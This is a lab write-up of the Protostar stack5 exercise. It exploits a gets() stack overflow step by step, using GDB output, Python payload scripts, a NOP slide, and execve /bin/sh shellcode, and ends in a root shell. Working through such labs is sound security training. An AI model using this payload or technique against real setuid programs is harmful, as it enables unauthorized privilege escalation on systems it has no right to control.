# Privilege Escalation
### Obtaining root access through unconventional means

The goal of this exercise is to try and execute commands as root from an unprivileged account.

The source code of this exercise is much simpler than the previous one. There's just one function call to ````gets()````, which we proved last exercise, allows us to write data to the stack.

Same as last time, let's throw some data at this thing.

First: our Python script.

~~~~
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print padding
~~~~

Now to run it, and pipe the output to a file so we don't have to keep typing the alphabet.

````python script.py > /tmp/alphabet````

Now, let's get GDB setup. We're going to set a breakpoint at the return of ````main```` and define "hook-stop" to display the next instruction to execute, along with the top 8 words on the stack.

~~~~
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) break *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
~~~~

Alright - we've got our alphabet, and our debugger ready to go... Let's see what happens.

~~~~
(gdb) r < /tmp/alphabet
Starting program: /opt/protostar/bin/stack5 < /tmp/alphabet
0x80483da <main+22>:    ret
0xbffff7bc:     0x54545454      0x55555555      0x56565656      0x57575757
0xbffff7cc:     0x58585858      0x59595959      0x5a5a5a5a      0xb7ffef00

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535                                                                                                                                                                                               b
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
~~~~

Looks like we've got our "Return" instruction ready to go, once we tell it to continue... And the stack looks beautiful! TTTT, UUUU, VVVV, WWWW, XXXX, YYYY, ZZZZ all in a row. Telling GDB to continue should yield an attempt by Return to go to memory address ````0x54545454````, which doesn't exist... Again, let's see what happens.

~~~~
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x54545454:     Error while running hook_stop:
Cannot access memory at address 0x54545454
0x54545454 in ?? ()
~~~~

Obvious to most, but I figured I'd at least reaffirm what I thought I already. understood.

Let's rejig our python script to be more useful. We've determined that our padding is up to the T's, so let's get rid of those and replace them with the location of the next instruction on the stack. Additionally, let's put a test instruction inside of that location, to prove we can execute arbitrary code. Let's just use good ol' ````INT 3````.

~~~~
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
eip = struct.pack("I", 0xbffff7c0)
payload = "\xCC"*4
print padding+eip+payload
~~~~

Output to file...

````python script.py > /tmp/exp````

And let's run this thing.

~~~~
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:    ret
0xbffff7bc:     0xbffff7c0      0x000000cc      0xbffff864      0xbffff86c
0xbffff7cc:     0xb7fe1848      0xbffff820      0xffffffff      0xb7ffeff4

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535                                                                                                                                                                                               b
) at stack5/stack5.c:11
11      in stack5/stack5.c
~~~~

Good, good. We've reached our breakpoint before the return, and look! There's ````0xbffff7c0````, right there at the top! That'll be where our program will "return" to... which is, of course, our ````INT 3```` instruction directly behind it. Let's continue!

~~~~
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff7c1:     add    BYTE PTR [eax],al
0xbffff7c0:     0x000000cc      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
0xbffff7c1 in ?? ()
~~~~

Heck yeah, SIGTRAP achieved! ````INT 3```` ran just as we expected it to. So it works in GDB, let's try it in the shell.

~~~~
user@protostar:~$ python script.py | /opt/protostar/bin/stack5
Floating point exception
~~~~

WTF, what went wrong? Let's take a look at it in GDB under a new session.

~~~~
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack5 < /tmp/exp

Program received signal SIGFPE, Arithmetic exception.
0xbffff7d1:     idiv   edi
0xbffff7d0:     0xbffff790      0xbffff790      0xbffff790      0xbffff790
0xbffff7e0:     0x000000cc      0xbffff884      0xbffff88c      0xb7fe1848
0xbffff7d1 in ?? ()
~~~~

Ah, look, the memory addresses are different. ````0xbffff7c0```` no longer points to  the ````0x000000cc```` instruction. We need to create a bigger target to hit than a very specific memory address. The best way to do this is with something called a NOP Slide.

By chaining together a bunch of "No Operation" instructions, we can create this range of memory addresses that just point further down the line. Hitting any one of them invariably leads to the end of the chain, and thus, our ````INT 3````.

Let's modify our Python script to make a NOP Slide. How about... 100 NOPs, and we'll shoot downrange by about 30.

~~~~
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7c0+30)
payload = "\x90"*100+"\xCC"*4
print padding+eip+payload
~~~~

That oughta do it. Output to file...

````python script.py > /tmp/exp````

And run!

~~~~
**(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:    ret
0xbffff7bc:     0xbffff7de      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11      in stack5/stack5.c
~~~~

Looking good, so far. We see our boatload of NOPs, with the opcode of 0x90. Let's continue.

~~~~
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff825:     int3
0xbffff7c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff825 in ?? ()
~~~~

Sweet! ````INT 3```` executed! Let's try it from the shell:

~~~~
user@protostar:~$ python script.py | /opt/protostar/bin/stack5
Trace/breakpoint trap
~~~~

Perfect! Code execution works. Now let's do something fun with it.

Let's grab some shellcode from the Internet that does, for example... executes /bin/sh.

Oh look, here's some: ````"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"````

Let's throw that sucker in our Python script and have at it.

~~~~
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7c0+30)
nopslide = "\x90"*100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding+eip+nopslide+payload
~~~~

Output to file...

````python script.py > /tmp/exp````

And run. But this time, we've gotta do something a little different because we need to connect stdout and stdin. The program ````cat```` can be used to link these two together, and we can hopefully get a shell out of this. Just a quick tweak to the call to the script, and...

~~~~
user@protostar:~$ (python ~/script.py ; cat) | /opt/protostar/bin/stack5
whoami
root
~~~~

Oh snap, we've got a root shell! Privilege escalation attack: SUCCESSFUL.

So, to recap, all we did was feed an existing program on the system data in such a way that we ended up with access to the root account. There were no modifications to the program itself, and all debugging was done under a normal user account.